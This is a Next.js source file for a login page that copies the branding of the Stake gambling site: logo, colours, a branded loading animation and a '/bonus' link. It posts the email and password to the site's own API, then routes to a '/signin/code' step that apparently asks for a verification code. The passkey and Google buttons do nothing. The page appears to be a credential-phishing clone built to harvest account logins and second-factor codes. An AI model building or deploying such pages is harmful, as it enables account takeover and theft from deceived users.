"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { X, Eye, EyeOff, Key } from "lucide-react";
import { useRouter } from "next/navigation";
import StakeTransition from "../component/StakeTransition";

export default function SignInPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showTransition, setShowTransition] = useState(true);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const router = useRouter();

  // Stake transition timeout
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowTransition(false);
    }, 4000);

    return () => clearTimeout(timer);
  }, []);

  // 🔑 SIGN IN HANDLER
  const handleSignIn = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const res = await fetch("/api/signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        setError(data.message || "Something went wrong");
        setLoading(false);
        return;
      }

      // ✅ SUCCESS → route to code page
      router.push("/signin/code");
    } catch (err) {
      setError("Unable to connect to server");
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      {/* FULL PAGE STAKE TRANSITION */}
      {showTransition && <StakeTransition />}

      <div className="min-h-screen bg-[#1D2C37] flex items-center justify-center p-6">
        <div className="bg-[#1D2C37] rounded-lg w-full max-w-md p-8 relative shadow-lg">
        {/* Close Button */}
        <Link
          href="/bonus"
          className="absolute top-6 right-6 text-white hover:text-gray-400 transition-colors"
        >
          <X size={24} />
        </Link>

        {/* Logo */}
        <div className="stake-logo text-white text-2xl mb-8">Stake</div>

        {/* Email Field */}
        <div className="mb-4">
          <label className="block text-[#A0A3A7] text-sm mb-2">
            Email or Username <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full bg-[#1D2C37] border-2 border-[#4A4D51] rounded-[6px] px-4 py-3 text-white focus:outline-none focus:border-blue-500"
          />
        </div>

        {/* Password Field */}
        <div className="mb-4">
          <label className="block text-[#A0A3A7] text-sm mb-2">
            Password <span className="text-red-500">*</span>
          </label>
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-[#1D2C37] border-2 border-[#4A4D51] rounded-[6px] px-4 py-3 pr-10 text-white focus:outline-none focus:border-blue-500"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#A0A3A7]"
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>
        </div>

        {/* ERROR MESSAGE */}
        {error && (
          <div className="mb-4 text-sm text-red-500 bg-red-500/10 p-3 rounded">
            {error}
          </div>
        )}

        {/* Sign In Button */}
        <button
          onClick={handleSignIn}
          disabled={loading}
          className="w-full bg-[#3366FF] hover:bg-[#2856E6] disabled:opacity-60 text-white font-semibold py-3 rounded-[6px] transition-colors mb-6"
        >
          {loading ? "Signing In..." : "Sign In"}
        </button>

        {/* Rest of UI unchanged */}
        {/* Alternative Sign In Options */}
        <div className="space-y-3 mb-6">
          <button className="w-full bg-[#2D3748] hover:bg-[#374151] text-white py-3 rounded-[6px] transition-colors flex items-center justify-center gap-2">
            <Key size={18} />
            Sign In with passkey
          </button>
          <button className="w-full bg-[#2D3748] hover:bg-[#374151] text-white py-3 rounded-[6px] transition-colors flex items-center justify-center gap-2">
            <svg className="w-5 h-5" viewBox="0 0 24 24">
              <path
                fill="#4285F4"
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              />
              <path
                fill="#34A853"
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              />
              <path
                fill="#FBBC05"
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
              />
              <path
                fill="#EA4335"
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
              />
            </svg>
            Sign In with Google
          </button>
          <button className="w-full bg-[#2D3748] hover:bg-[#374151] text-white py-3 rounded-[6px] transition-colors">
            Sign In another way
          </button>
        </div>

        {/* Register Link */}
        <div className="text-center">
          <span className="text-[#A0AEC0] text-sm">Don&apos;t have an account? </span>
          <Link href="#" className="text-white hover:text-gray-300 text-sm font-semibold transition-colors">
            Register an Account
          </Link>
        </div>
      </div>
      </div>
    </>
  );
}
